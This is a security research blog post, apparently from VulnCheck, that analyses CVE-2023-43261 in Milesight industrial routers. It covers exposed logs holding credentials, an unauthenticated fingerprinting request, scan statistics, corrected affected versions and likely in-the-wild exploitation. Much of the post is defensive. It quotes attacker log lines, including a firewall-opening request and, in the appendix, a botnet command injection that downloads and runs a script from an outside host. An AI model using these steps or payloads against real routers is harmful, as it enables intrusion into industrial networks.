---
title: "Looking for CVE-2023-43261 in the Real World - Blog - VulnCheck"
date: 2023-10-13T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Looking for CVE-2023-43261 in the Real World - Blog - VulnCheck

<br/>

<br/>
::check-list\\n---\\ntitle: Key Takeaways\\nico: mdi:check-bold\\nlist:\\n - CVE-2023-43261 has likely been exploited in the wild, but not at scale.\\n - The CVE description does not report the correct set of affected industrial cellular routers nor the correct set of affected firmware.\\n - Although recently disclosed, CVE-2023-43261 was patched years ago.\\n---\\n::\\n\\n# A Wordy Pre-Amble\\n\\nThe recent disclosure of \[CVE-2023-43261\](https://nvd.nist.gov/vuln/detail/CVE-2023-43261) caught our attention because it reportedly affected a set of well-known industrial cellular routers created by \[Milesight\](https://www.milesight.com/). Industrial cellular routers are interesting because they potentially connect an ICS network to the internet. Exploitation might allow an attacker to access the ICS network from the internet. That’s pretty darn interesting.\\n\\nWhy would someone use a cellular router in an ICS network though? Say, for example, you needed to monitor the status of a thousand-mile-long oil pipeline. How do you monitor the portion that cuts through the middle of nowhere? One solution is to use an industrial cellular router. \\n\\nOf course, now you’ve connected your oil pipeline to the internet, which definitely sounds dangerous. Everything will probably be fine if the router doesn’t expose any services to the internet. Of course, mistakes \*do\* happen, and that’s how you end up with thousands of Milesight industrial cellular routers exposed to the internet.\\n\\n!\[Milesight on Censys\](/blog/real-world-cve-2023-43261/censys.png){:width="100%"}\\n\\nWhile the oil pipeline scenario is hypothetical, Milesight has documented affected products being used by \[Rail Freight Transport\](https://www.milesight-iot.com/success-stories/milesight-facilitates-italy-rail-freight-transport/), \[ATM networks\](https://www.milesight-iot.com/success-stories/cellular-connectivity-solution-for-atm-machines/), and \[Emergency Vehicles\](https://www.milesight-iot.com/success-stories/5g-cellular-router-special-vehicles/). With a good amount of potentially vulnerable hosts, and potentially interesting networks on the other side, you can understand why these routers pique our interest. Let’s look deeper at the vulnerability.\\n\\n# A Glimpse at CVE-2023-43261\\n\\nThe NVD description describes the vulnerability as:\\n\\n> An information disclosure in Milesight UR5X, UR32L, UR32, UR35, UR41 before v35.3.0.7 allows attackers to access sensitive router components.\\n\\nHonestly, a fairly useless description. No vector? No impact? No auth level? Fortunately, a detailed description was written up by \[Bipin Jitiya\](https://medium.com/@win3zz/inside-the-router-how-i-accessed-industrial-routers-and-reported-the-flaws-29c34213dfdf) on Medium. A basic summary is the router exposes its \`httpd.log\` (among other things) to remote and unauthenticated attackers via the web interface. Additionally, the router logs a lot of things it shouldn’t: web credentials, vpn credentials, wireless keys, ddns credentials, etc.\\n\\nBelow is an example of credentials being logged during web authentication.\\n\\n\`\`\`json\\n2023-10-05 16:25:30 \[x.x.x.x:Not Loggined in\]:data: {"id":"1","execute":1,"core":"user","function":"login","values":\[{"username":"admin","password":"rIuWTTKEjXPXY3oAN7V2kQ=="}\]}\\n\`\`\`\\n\\nAs you can see, both the username and password are present. The password appears encrypted, and it is. But it’s encrypted with a static key and IV, so it’s trivial to \[decrypt\](https://vulncheck.com/xdb/645b345f1d81). All an attacker needs to do is fetch the \`httpd.log\`, decrypt the last successful login, and then they have full access to the web interface too. The web interface allows the user to configure vpn servers and drop firewall protections (among other things), so once you have credentials, it’s fairly easy to access the ICS (or industrial-adjacent) network from the internet. \\n\\nGiven the ease of exploitation and large number of potential victims (for ICS), we had a few questions that we felt needed to be answered:\\n1. The CVE description provides an affected firmware version that only applies to one of the listed models. V35.3.0.7, the listed firmware, is only used by the model UR35, but the CVE description lists a number of other affected models (UR5X, UR32L, UR32, UR35, UR41).\\n2. How many of the systems we saw on Censys are actually vulnerable?\\n3. Is CVE-2023-43261 being actively exploited?\\n\\nIn the remainder of this blog, we’ll explore these three questions.\\n\\n## Who Is Vulnerable?\\n\\nAcquiring old firmware from Milesight appears to be a no-go, so we were forced to do this the good old-fashioned way:\\n1. Get a list of internet-facing systems. \\n2. Find a way to get their model and version without authentication.\\n3. Attempt to download the \`httpd.log\` file.\\n\\nThe first two steps were easy (Shodan, Censys, FOFA, whatever you please). The second step turned out to be quite easy as well. The router responds to an unauthenticated HTTP request to \`/islogin\` with a detailed description of the model and version.\\n\\n\`\`\`json\\ncurl -ks https://192.168.1.1/login | jq\\n{\\n "id": -1,\\n "model": "UR35",\\n "pn": "",\\n "oem": "0000",\\n "rtver": "35.2.0.10",\\n "status": -2,\\n "result": \[\\n {\\n "login": "false",\\n "ysrole": 0,\\n "timeout": 0,\\n "upgrade\_error": 0\\n }\\n \]\\n}\\n\`\`\`\\n\\nAbove, you can see the response is from a UR35 running firmware version 35.2.0.10. Obviously, very useful data if you are interested in potentially exploiting these things. This is the type of fingerprinting I’d expect to see on \[Greynoise\](https://viz.greynoise.io/query?gnql=%22%2Fislogin%22), but there is no indication that anyone is doing so at this time.\\n\\nUsing \`/islogin\` and our list of internet-facing systems, we were able to compile two useful lists: the most prevalent models in the wild and the most prevalent firmware versions. The following pie chart shows that the vast majority of routers are UR32/UR32L/UR35. There are actually 23 different slices, but the other models are far fewer (additional slices include more UR series, UG series, NA series, and something simply called “Unknown”).\\n\\n> Milesight Industrial Cellular Router Models in the Wild\\n\\n::pie-chart\\n---\\nlabels:\\n - UR32L\\n - UR32\\n - UR35\\n - UG65\\n - UG67\\n - UG87\\n - UR75\\n - UR51\\n - UR32S\\n - NA32L\\n - NA32\\n - UG56\\n - UR55\\n - NA35\\n - UG85\\n - UR76\\n - UR52\\n - Unknown\\n - UR41\\n - UG63\\n - UR72\\n - UF51\\n - NA41\\nvalues:\\n - 832\\n - 781\\n - 294\\n - 126\\n - 36\\n - 29\\n - 20\\n - 19\\n - 16\\n - 10\\n - 9\\n - 7\\n - 6\\n - 6\\n - 4\\n - 3\\n - 3\\n - 3\\n - 2\\n - 2\\n - 1\\n - 1\\n - 1\\n---\\n::\\n\\nIn the next pie chart, you can see the firmware listed in the CVE description (35.3.0.7) doesn’t have a large enough slice to be listed. Half of the pie is actually made up of firmware, starting with 32. If you take the CVE description at face value, those should be vulnerable, right? (this is foreshadowing)\\n\\n> Milesight Industrial Cellular Router Firmware Versions in the Wild\\n\\n::pie-chart\\n---\\nlabels:\\n - 32.3.0.7\\n - 32.3.0.5\\n - 32.3.0.4\\n - 32.3.0.1\\n - 32.3.0.3\\n - 32.3.0.6\\n - 32.2.0.33\\n - 32.3.4801.5\\n - 61.1.0.9\\n - 32.3.0.2\\n - 32.3.10.6\\n - 32.2.0.39\\n - 35.2.0.36\\n - 32.2.0.20\\n - 35.3.0.2\\n - 32.3.10.5\\n - 35.3.0.5\\n - 35.3.0.3\\n - 35.3.0.4\\n - 32.2.0.36\\n - 35.2.0.38\\n - 61.0.0.37\\n - 32.2.0.28\\n - 61.1.0.8\\n - 60.0.0.42\\n - 51.3.0.41\\n - 35.2.0.20\\n - 34.3.0.4\\n - 80.0.0.83\\n - 61.1.0.7\\n - 35.3.0.7\\n - 35.3.0.6\\n - 35.3.10.6\\n - 35.1.0.61\\n - 32.1.0.61\\n - 32.2.0.32\\n - 35.2.0.32\\n - 1.2.0.64\\n - 61.0.0.36\\n - 60.0.0.37\\n - 56.0.0.3\\n - 35.3.4801.5\\n - 35.3.0.1\\n - 35.1.0.58\\n - 32.1.0.32\\n - 80.0.0.85\\n - 80.0.0.66\\n - 32.2.0.35\\n - 32.2.0.18\\n - 60.0.0.38\\n - 35.2.0.33\\n - 32.2.0.29\\n - 60.0.0.41\\n - 60.0.0.40\\n - 60.0.0.36\\n - 35.1.0.35\\n - 32.2.0.10\\n - 76.1.0.21\\n - 55.3.0.41\\n - 52.3.0.41\\n - 41.0.0.2\\n - 1.2.0.79\\n - 80.0.0.82\\n - 80.0.0.75\\n - 80.0.0.53\\n - 76.2.0.8\\n - 76.2.0.6\\n - 63.0.0.1\\n - 61.1.0.2\\n - 35.2.0.18\\n - 35.2.0.10\\n - 35.1.0.32\\n - 32.3.0654.2\\n - 32.2.0.22\\n - 32.1.0.41\\n - 1.2.0.46\\n - 76.2.0.7\\n - 60.0.0.39\\n - 55.2.0.45\\n - 55.2.0.42\\n - 55.1.0.69\\n - 35.2.0.21\\n - 32.2.0.6\\n - 32.2.0.27\\n - 32.1.61.18\\n - 32.1.0.48\\n - 32.1.0.17\\n - 2.2.0.81\\n - 1.2.0.86\\n - 1.2.0.38\\n - 1.1.0.69\\nvalues:\\n - 657\\n - 166\\n - 155\\n - 82\\n - 71\\n - 66\\n - 61\\n - 60\\n - 50\\n - 50\\n - 47\\n - 46\\n - 37\\n - 35\\n - 34\\n - 32\\n - 30\\n - 30\\n - 29\\n - 27\\n - 26\\n - 23\\n - 21\\n - 20\\n - 20\\n - 19\\n - 18\\n - 16\\n - 15\\n - 15\\n - 14\\n - 13\\n - 12\\n - 12\\n - 11\\n - 9\\n - 8\\n - 8\\n - 7\\n - 7\\n - 7\\n - 7\\n - 7\\n - 7\\n - 7\\n - 6\\n - 6\\n - 6\\n - 6\\n - 5\\n - 5\\n - 5\\n - 4\\n - 4\\n - 4\\n - 4\\n - 4\\n - 3\\n - 3\\n - 3\\n - 3\\n - 3\\n - 2\\n - 2\\n - 2\\n - 2\\n - 2\\n - 2\\n - 2\\n - 2\\n - 2\\n - 2\\n - 2\\n - 2\\n - 2\\n - 2\\n - 1\\n - 1\\n - 1\\n - 1\\n - 1\\n - 1\\n - 1\\n - 1\\n - 1\\n - 1\\n - 1\\n - 1\\n - 1\\n - 1\\n - 1\\n---\\n::\\n\\nArmed with many potential vulnerable targets, we set out to establish if this was being exploited in the wild. In order to do that, we needed to grab the \`httpd.log\` to determine if attackers were logging into systems on their first try. However, this is where we ran into trouble. The \`httpd.log\` was rarely available.\\n\\nThe NVD entry for CVE-2023-43261 reports 35.3.0.7 as the fixed version (published in \[July 2023\](https://www.milesight.com/iot/resources/download/release-note/?type=ur3x)). If you take that at face value, the vast majority of routers in the pie chart above should be vulnerable (because 32.x is by far the most popular version). The reality, however, is that the major value (e.g., 35 or 32) describes the model the firmware is for. 35.3.0.7 is only for UR35. So, 35.3.0.7 can’t be the fixed version for UR32L/UR32. But, since 32.3.0.7 was released at the exact same time as 35.3.0.7, we can assume that the CVE description is wrong and that it should have listed a patched version for each model.\\n\\nAssuming 32.3.0.7 is the patch version for UR32L/UR32, we can see a good chunk of routers \*are\* using a patched version. In fact, 32.3.0.7 is the largest slice of the pie above.\\n\\nBut that large chunk wasn’t enough to account for all the failures we were seeing. We weren’t just failing to fetch \`httpd.log\` from 35.3.0.7. We also failed on 35.3.0.6 and 35.3.0.5 and 35.3.0.4 and any other version all the way down to 35.2.0.10 (aka 32.2.0.10). This implies the first patch went into 35.2.0.18 and \*not\* 35.3.0.7.\\n\\nMilesight historically did a bad job of dating releases, but thanks to the \[Wayback Machine,\](https://web.archive.org/web/20210305101210/https://www.milesight-iot.com/firmware-release-note/) we know that in March 2021 was the most recent release of UR35 was 35.2.0.32, a version we determined that we \*could not\* get the \`httpd.log\` from. That means CVE-2023-43261 has been patched for years!\\n\\nSo not only does the CVE provide insufficient affected versions, but the one it does provide is wrong. Based on the data we collected, we believe the affected models and their last vulnerable version are something like this (note that some of these are forever days, but they are also older models, so it’s unlikely to be seen in large numbers):\\n\\n\* UR32: 32.2.0.10\\n\* UR32L: Not affected versions\\n\* UR35: 35.2.0.10\\n\* UR41: Not affected versions\\n\* UR51: 51.3.0.41 (Final release / Discontinued)\\n\* UR52: 52.3.0.41 (Final release / Discontinued)\\n\* UR55: 55.3.0.41 (Final release / Discontinued)\\n\* UR72: 72.2.0.81 (Final release / Discontinued)\\n\* UR75: 75.2.0.81 (Final release / Discontinued)\\n\* UR75 5g: No affected versions\\n\* UR76: No affected versions\\n\\nNow that we know the actual affected versions, we can revisit all the firmware versions we collected to determine how many vulnerable systems exist in the wild. The following pie graph spells things out clearly:\\n\\n> Vulnerable Milesight Industrial Cellular Routers in the Wild\\n\\n::pie-chart\\n---\\nlabels:\\n - Not Vulnerable\\n - Vulnerable\\nvalues:\\n - 93.5\\n - 6.5\\n---\\n::\\n\\nOnly ~5% of the internet-facing routers are vulnerable. That's a huge drop from what the CVE description led us to believe. But it’s not all bad. To paraphrase a recently popular tweet, “You won’t catch me crying that I only have a couple of hundred industrial networks to breach.” \\n\\nWhich leads us to the question, is this being exploited in the wild?\\n\\n# Probably Exploited in the Wild?\\n\\nThe answer is “probably.” It’s difficult to precisely say just from the logs. We lack some amount of context. We did not observe obvious mass exploitation. However, there is evidence of small-scale exploitation. Consider the following example.\\n\\nWe observed \[5.61.39.232\](https://www.shodan.io/host/5.61.39.232) attempting to log into six systems on October 2, 2023. The affected systems’ IP addresses geolocate to France, Lithuania, and Norway. They don’t appear to be related, and all use different non-default credentials.\\n\\nOn four systems, the attacker successfully authenticated on the first attempt. One time, the attacker attempted two different passwords. Both passwords (failed and successful) were already present in the \`httpd.log\`. Finally, on the last system, they could not authenticate. The \`httpd.log\` had many login attempts but no successful logins. The attacker attempted all the unique credentials that were already in \`httpd.log\` and then made no more attempts. That pattern could reasonably be CVE-2023-43261.\\n\\nWhat did the attacker do once they logged in? In each case, for this particular attacker, they made no changes. They appeared to rifle through all the settings/status pages (sms inbox, openvpn server, users, ddns config, etc.) and log out. Perhaps recon? Perhaps just someone who is curious? Unclear. Some of the victims did have configured vpn servers, and the attacker did expose the cleartext credentials, which is enough for the attacker to pivot into the ICS network.\\n\\nThere are other examples of potential attacks, but as stated, they are not widespread. Not all attackers are hands-off. There are examples of potential attackers configuring the vpn and even opening up the firewall (this is \[200.73.18.40\](https://viz.greynoise.io/ip/200.73.18.40) going after a system in Canada):\\n\\n\`\`\`json\\n2023-10-04 20:11:24 \[200.73.18.40:admin\]:data: {"id":51,"execute":1,"core":"yruo\_firewall\_security","function":"set","values":\[{"base":"yruo\_firewall\_security","index":1,"value":{"http\_remote":1,"https\_remote":1,"telnet\_remote":1,"ssh\_remote":1,"ftp\_local":1,"ftp\_remote":1,"url":\["http://"\],"keyword":\[""\]}}\]}\\n\`\`\`\\n\\nOf course, it’s difficult to determine exactly what is an attacker and what is a bad admin. Maybe the real administrator \*does\* log in using a VPN in Chile. We suspect not, but anything is possible, which is why we leave this at “probably exploited in the wild” but not at scale.\\n\\n# Conclusion\\n\\nOur interest in CVE-2023-43261 centered around the idea that there were a lot of vulnerable routers that might provide attackers with access to ICS networks. We learned, in reality, CVE-2023-43261 was patched long ago. The CVE description is not only inadequate but also inaccurate, and the vast majority of internet-facing systems are patched. Nonetheless, , we do see some evidence of exploitation in the wild.\\n\\nIf you have a Milesight Industrial Cellular Router, it’s probably wise to assume all the credentials on the system have been compromised and to simply generate new ones, and ensure no interfaces are reachable via the internet.\\n\\n# Appendix\\n\\nSomewhat related to all of the above, but slightly beside the point, is that these routers end up logging a lot of information from unauthenticated users. One request most of the routers ended up logging looks like this:\\n\\n\`\`\`sh\\n2023-10-04 16:59:49 \[103.83.144.161:Not Loggined in\]:data: command=2&ipAddr=&dnsAddr=$(cd+/tmp;wget+http://194.180.48\[.\]100/l.sh;curl+-O+http://194.180.48\[.\]100/l.sh;sh+l.sh)&interface=0&netType=0&scrFilter=&dstFilter=&fi\\n\`\`\`\\n\\nThis appears to be the \[Dark.IoT\](https://www.radware.com/security/threat-advisories-and-attack-reports/dark-iot-botnet/) botnet throwing \[CVE-2021-36380\](https://research.nccgroup.com/2021/07/26/technical-advisory-sunhillo-sureline-unauthenticated-os-command-injection-cve-2021-36380/). We’ve put the MIPS version of the downloaded binary on \[VirusTotal\](https://www.virustotal.com/gui/file/ba0481b0a57c4e94b59b6a3f20ba1c41a8329c88cf01c578ac734f3638ecfa59/detection). The binary has a few additional exploits it uses for spreading.\\n

#### [Source](https://vulncheck.com/blog/real-world-cve-2023-43261)

<br/>
---
